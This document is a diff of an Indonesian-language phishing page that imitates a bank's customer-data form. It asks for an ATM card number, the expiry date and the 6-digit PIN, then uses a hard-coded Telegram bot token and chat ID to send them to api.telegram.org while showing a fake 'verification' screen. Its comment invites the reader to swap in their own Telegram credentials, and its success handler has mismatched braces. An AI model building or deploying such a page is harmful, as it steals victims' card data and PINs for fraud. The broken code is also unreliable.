@@ -1,174 +1,399 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Form Data Nasabah</title>
-
-<style>
-  body {
-    margin: 0;
-    font-family: 'Arial', sans-serif;
-    background-color: #fff;
-  }
-  .header {
-    background: linear-gradient(45deg, #1669b9, #1eaefc);
-    color: white;
-    padding: 20px 16px;
-    position: relative;
-  }
-  .back-arrow {
-    position: absolute;
-    left: 16px;
-    top: 20px;
-    font-weight: bold;
-    font-size: 24px;
-    cursor: pointer;
-  }
-  .header h2 {
-    margin: 0;
-    text-align: center;
-    font-weight: 600;
-  }
-  .container {
-    margin: 20px 16px;
-  }
-  label {
-    font-weight: 500;
-    color: #6d6d72;
-    font-size: 14px;
-    display: block;
-    margin-bottom: 6px;
-  }
-  input[type=text], input[type=password], input[type=tel] {
-    width: 100%;
-    padding: 12px 40px 12px 12px;
-    font-size: 14px;
-    border-radius: 8px;
-    border: 1px solid #d8d8d8;
-    background-color: #f6f8fa;
-    box-sizing: border-box;
-    color: #1669b9;
-    font-weight: 600;
-    letter-spacing: 0.1em;
-    outline: none;
-  }
-  .input-with-icon {
-    position: relative;
-    margin-top: 6px;
-  }
-  .input-with-icon svg {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    cursor: pointer;
-    fill: #1669b9;
-    width: 20px;
-    height: 20px;
-  }
-  .helper-text {
-    font-size: 12px;
-    color: #999;
-    text-align: right;
-    margin-top: 2px;
-  }
-  button {
-    background-color: #ffcb45;
-    border: none;
-    color: #666;
-    font-weight: 600;
-    width: 100%;
-    padding: 14px 0;
-    font-size: 16px;
-    border-radius: 10px;
-    margin-top: 32px;
-    cursor: pointer;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Form Data Nasabah</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      color: #828282;
+      -webkit-font-smoothing: antialiased;
+    }
+    header {
+      height: 56px;
+      background: #1989DD;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      box-shadow: 0 1px 4px rgb(0 0 0 / 0.1);
+    }
+    .back-arrow {
+      width: 24px;
+      height: 24px;
+      stroke: #fff;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      cursor: pointer;
+      user-select: none;
+    }
+    .container {
+      background: #fff;
+      border-radius: 20px 20px 0 0;
+      padding: 24px 24px 40px 24px;
+      max-width: 400px;
+      margin: -4px auto 0 auto;
+      box-shadow: 0 -2px 15px rgb(0 0 0 / 0.03);
+    }
+    h2 {
+      font-weight: 400;
+      font-size: 16px;
+      line-height: 22px;
+      color: #7F8FA4;
+      margin: 0 0 18px 0;
+    }
+    label {
+      font-size: 14px;
+      line-height: 20px;
+      color: #B1B9C9;
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 400;
+    }
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 24px;
+    }
+    input {
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      background: #F3F6FA;
+      color: #33475B;
+      font-size: 14px;
+      line-height: 20px;
+      padding: 14px 40px 14px 16px;
+      outline: none;
+      font-weight: 400;
+      box-sizing: border-box;
+    }
+    input::placeholder {
+      color: #B1B9C9;
+      font-weight: 400;
+    }
+    .counter {
+      position: absolute;
+      right: 12px;
+      bottom: 8px;
+      font-size: 12px;
+      color: #B1B9C9;
+      user-select: none;
+      font-weight: 400;
+    }
+    .input-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+    }
+    .calendar-icon path,
+    .calendar-icon rect,
+    .calendar-icon line {
+      stroke: #1989DD;
+      stroke-width: 1.8;
+      stroke-linejoin: round;
+      stroke-linecap: round;
+      fill: none;
+    }
+    .eye-icon path,
+    .eye-icon circle,
+    .eye-icon line {
+      stroke: #1989DD;
+      stroke-width: 1.8;
+      stroke-linejoin: round;
+      stroke-linecap: round;
+      fill: none;
+    }
+    button {
+      width: 100%;
+      padding: 14px 0;
+      background: #F5B700;
+      border-radius: 8px;
+      border: none;
+      font-weight: 600;
+      font-size: 16px;
+      line-height: 22px;
+      color: #33475B;
+      cursor: pointer;
+      margin-top: 5px;
+      box-shadow: 0 2px 4px rgb(245 183 0 / 0.6);
+      transition: filter 0.2s ease;
+    }
+    button:active {
+      filter: brightness(0.95);
+    }
+    /* Success page styles */
+    .success-page {
+      display: none;
+      flex: 1;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 24px;
+      max-width: 400px;
+      margin: 0 auto;
+      min-height: calc(100vh - 56px);
+    }
+    .success-page .icon {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 24px;
+      stroke: #1989DD;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+      animation: spin 2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .success-page h2 {
+      font-weight: 600;
+      font-size: 20px;
+      line-height: 28px;
+      color: #33475B;
+      margin: 0 0 8px 0;
+    }
+    .success-page p {
+      font-size: 14px;
+      line-height: 20px;
+      color: #7F8FA4;
+      margin: 0 0 32px 0;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #F3F6FA;
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 24px;
+    }
+    .progress-fill {
+      height: 100%;
+      background: #F5B700;
+      width: 0%;
+      animation: fill 3s ease-in-out forwards;
+    }
+    @keyframes fill {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+  </style>
 </head>
-
 <body>
+  <header>
+    <svg class="back-arrow" viewBox="0 0 24 24" fill="none" onclick="resetToForm()">
+      <path d="M15 18l-6-6 6-6"/>
+    </svg>
+  </header>
 
-<div class="header">
-  <div class="back-arrow">&#8592;</div>
-  <h2>Informasi Data Nasabah.</h2>
-</div>
+  <!-- Form Page -->
+  <main id="formPage" class="container">
+    <h2>Informasi Data Nasabah.</h2>
 
-<div class="container">
-  <form id="formData" name="formData">
+    <form id="atmForm" autocomplete="off" novalidate>
+      <div class="input-wrapper">
+        <label for="cardNumber">Nomor Kartu ATM</label>
+        <input 
+          type="text" 
+          id="cardNumber" 
+          name="cardNumber" 
+          maxlength="18"
+          placeholder="Masukkan nomor kartu ATM Kamu"
+          pattern="\d*"
+          inputmode="numeric"
+          required
+          aria-describedby="cardNumberCounter"
+        />
+        <div class="counter" id="cardNumberCounter">0/18</div>
+      </div>
 
-    <label for="cardNumber">Nomor Kartu ATM</label>
-    <input 
-      type="tel" 
-      id="cardNumber" 
-      name="cardNumber" 
-      maxlength="18" 
-      placeholder="Masukkan nomor kartu ATM Kamu" 
-      pattern="\d*" 
-      inputmode="numeric" 
-    />
-    <div class="helper-text" id="cardNumberCount">0/18</div>
+      <div class="input-wrapper">
+        <label for="expiryDate">Tanggal Kadaluarsa Kartu ATM</label>
+        <input 
+          type="text" 
+          id="expiryDate" 
+          name="expiryDate" 
+          maxlength="5"
+          placeholder="MM/YY"
+          pattern="(0[1-9]|1[0-2])\/\d{2}"
+          aria-describedby="expiryDateHelper"
+          required
+        />
+        <svg class="input-icon calendar-icon" viewBox="0 0 24 24" fill="none">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+          <line x1="16" y1="2" x2="16" y2="6"/>
+          <line x1="8" y1="2" x2="8" y2="6"/>
+          <line x1="3" y1="10" x2="21" y2="10"/>
+        </svg>
+      </div>
 
-    <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
-    <div class="input-with-icon">
-      <input 
-        type="tel" 
-        id="expiryDate" 
-        name="expiryDate" 
-        placeholder="MMYY"
-        maxlength="4" 
-        pattern="\d{4}" 
-        inputmode="numeric" 
-      />
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-        <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
-      </svg>
+      <div class="input-wrapper">
+        <label for="pin">6-Digit PIN Kartu ATM</label>
+        <input 
+          type="password" 
+          id="pin" 
+          name="pin" 
+          maxlength="6"
+          placeholder="PIN"
+          pattern="\d{6}"
+          inputmode="numeric"
+          aria-describedby="pinCounter"
+          required
+        />
+        <svg id="togglePin" class="input-icon eye-icon" viewBox="0 0 24 24" fill="none">
+          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+        <div class="counter" id="pinCounter">0/6</div>
+      </div>
+
+      <button type="submit">Selanjutnya</button>
+    </form>
+  </main>
+
+  <!-- Success Page -->
+  <main id="successPage" class="success-page">
+    <svg class="icon" viewBox="0 0 24 24" fill="none">
+      <circle cx="12" cy="12" r="10" stroke="#F3F6FA" stroke-width="2"/>
+      <path d="M12 6v6l4 2"/>
+    </svg>
+
+    <h2>Proses Verifikasi</h2>
+    <p>Data nasabah sedang diverifikasi. Mohon tunggu sebentar...</p>
+
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
     </div>
 
-    <label for="pin" style="margin-top: 20px;">6-Digit PIN Kartu ATM</label>
-    <div class="input-with-icon">
-      <input 
-        type="password" 
-        id="pin" 
-        name="pin" 
-        maxlength="6" 
-        placeholder="PIN" 
-        pattern="\d*" 
-        inputmode="numeric"
-      />
-      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-        <path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
-        <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />
-      </svg>
-    </div>
-    <div class="helper-text" id="pinCount">0/6</div>
+    <button onclick="resetToForm()">Kembali ke Awal</button>
+  </main>
 
-    <button type="submit">Selanjutnya</button>
-  </form>
-</div>
+  <script>
+    // Ganti dengan token dan chat ID Telegrammu
+    const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';
+    const CHAT_ID = '7213790655';
 
-<script>
-  // Counter kartu
-  const cardNumberInput = document.getElementById('cardNumber');
-  const cardNumberCount = document.getElementById('cardNumberCount');
-  cardNumberInput.addEventListener('input', () => {
-    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
-  });
+    const formPage = document.getElementById('formPage');
+    const successPage = document.getElementById('successPage');
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardNumberCounter = document.getElementById('cardNumberCounter');
+    const pinInput = document.getElementById('pin');
+    const pinCounter = document.getElementById('pinCounter');
+    const expiryDateInput = document.getElementById('expiryDate');
+    const togglePinIcon = document.getElementById('togglePin');
+    const form = document.getElementById('atmForm');
 
-  // Counter PIN
-  const pinInput = document.getElementById('pin');
-  const pinCount = document.getElementById('pinCount');
-  pinInput.addEventListener('input', () => {
-    pinCount.textContent = `${pinInput.value.length}/6`;
-  });
+    // Update counter card number
+    cardNumberInput.addEventListener('input', () => {
+      cardNumberInput.value = cardNumberInput.value.replace(/\D/g, '');
+      cardNumberCounter.textContent = `${cardNumberInput.value.length}/18`;
+    });
 
-  // Toggle PIN visibility
-  const togglePin = document.getElementById('togglePin');
-  togglePin.addEventListener('click', () => {
-    pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
-  });
-</script>
-    <script src="script.js"></script>
+    // Update counter PIN
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '');
+      pinCounter.textContent = `${pinInput.value.length}/6`;
+    });
+
+    // Format MM/YY for expiry date input
+    expiryDateInput.addEventListener('input', () => {
+      let val = expiryDateInput.value.replace(/[^\d]/g, '');
+      if (val.length > 4) val = val.slice(0,4);
+      if (val.length > 2) {
+        val = val.slice(0,2) + '/' + val.slice(2);
+      }
+      expiryDateInput.value = val;
+    });
+
+    // Toggle show/hide PIN password
+    togglePinIcon.addEventListener('click', () => {
+      if (pinInput.type === 'password') {
+        pinInput.type = 'text';
+        togglePinIcon.innerHTML = `
+          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+          <circle cx="12" cy="12" r="3"/>
+        `;
+      } else {
+        pinInput.type = 'password';
+        togglePinIcon.innerHTML = `
+          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+          <circle cx="12" cy="12" r="3"/>
+        `;
+      }
+    });
+
+    // Function to reset to form
+    function resetToForm() {
+      successPage.style.display = 'none';
+      formPage.style.display = 'block';
+      form.reset();
+      cardNumberCounter.textContent = '0/18';
+      pinCounter.textContent = '0/6';
+    }
+
+    // Handle form submission - send data to Telegram and show success page
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const cardNumber = cardNumberInput.value.trim();
+      const expiryDate = expiryDateInput.value.trim();
+      const pin = pinInput.value.trim();
+
+      // Validasi sederhana
+      if(cardNumber.length !== 18) {
+        alert('Nomor Kartu ATM harus 18 digit.');
+        return;
+      }
+      if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
+        alert('Tanggal Kadaluarsa harus dalam format MM/YY.');
+        return;
+      }
+      if(pin.length !== 6) {
+        alert('PIN harus 6 digit.');
+        return;
+      }
+
+      const message =
+        `📋 Informasi Data Nasabah:\n\n` +
+        `• Nomor Kartu ATM: ${cardNumber}\n` +
+        `• Tanggal Kadaluarsa: ${expiryDate}\n` +
+        `• PIN Kartu ATM: ${pin}`;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+      try {
+        const response = await fetch(url);
+        const data = await response.json();
+        if(data.ok) {
+    window.location.href = 'success.html';  // Redirect ke file success.html
+  }
+          // Hide form and show success page
+          formPage.style.display = 'none';
+          successPage.style.display = 'flex';
+        } else {
+          alert('Gagal mengirim data. Silakan coba lagi.');
+          console.error('Telegram API error:', data);
+        }
+      } catch (error) {
+        alert('Terjadi kesalahan saat mengirim data.');
+        console.error(error);
+      }
+    });
+  </script>
 </body>
 </html>
